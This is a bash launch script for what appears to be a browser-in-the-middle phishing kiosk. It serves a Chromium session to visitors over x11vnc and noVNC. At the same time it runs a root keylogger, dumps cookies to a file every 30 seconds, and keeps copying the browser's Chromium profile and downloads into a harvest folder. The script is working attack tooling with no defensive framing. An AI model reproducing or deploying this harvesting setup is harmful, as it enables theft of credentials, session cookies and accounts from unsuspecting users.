while read -rd $'' line; do export "$line" ; done < <(jq -r <<<"$values" 'to_entries|map("\(.key)=\"\(.value)\"\u0000")[]' /tmp/client_info.txt)
readarray -d "x" -t array <<< "${RESOLUTION//\"}" && sudo sed -i "s/WIDTH,HEIGHT/${array[0]},${array[1]}/" /etc/chromium/chromium.conf
sudo rm -f /tmp/.X${DISPLAY#:}-lock ; /bin/bash -c "/home/user/kiosk.sh" &

nohup /bin/bash -c "touch /home/user/Downloads/Cookies.txt ; mkdir /home/user/Downloads/Default" &
nohup /bin/bash -c "touch /home/user/Downloads/Keylogger.txt;" &
nohup /bin/bash -c "sudo python3 /home/user/keylogger.py 2> log.txt" &
nohup /bin/bash -c "while true ; do sleep 30 ; sudo python3 cookies.py > Downloads/Cookies.txt ; done" &
nohup /bin/bash -c "while true ; do sleep 30 ; sudo cp -R -u /root/.config/chromium/Default /home/user/Downloads/ ; done" &
nohup /bin/bash -c "while true ; do sleep 30 ; sudo cp -R -u /root/Downloads/ /home/user/Downloads/ ; done" &

nohup /usr/bin/Xvfb $DISPLAY -screen 0 ${RESOLUTION//\"} -ac +extension GLX +render -noreset > /dev/null || true &
while [[ ! $(xdpyinfo -display $DISPLAY 2> /dev/null) ]]; do sleep .3; done
nohup x11vnc -xkb -noxrecord -noxfixes -noxdamage -many -shared -display $DISPLAY -rfbauth /home/user/.vnc/passwd -rfbport 5900 "$@" &
nohup /home/user/noVNC/utils/novnc_proxy --vnc localhost:5900 --listen 5980
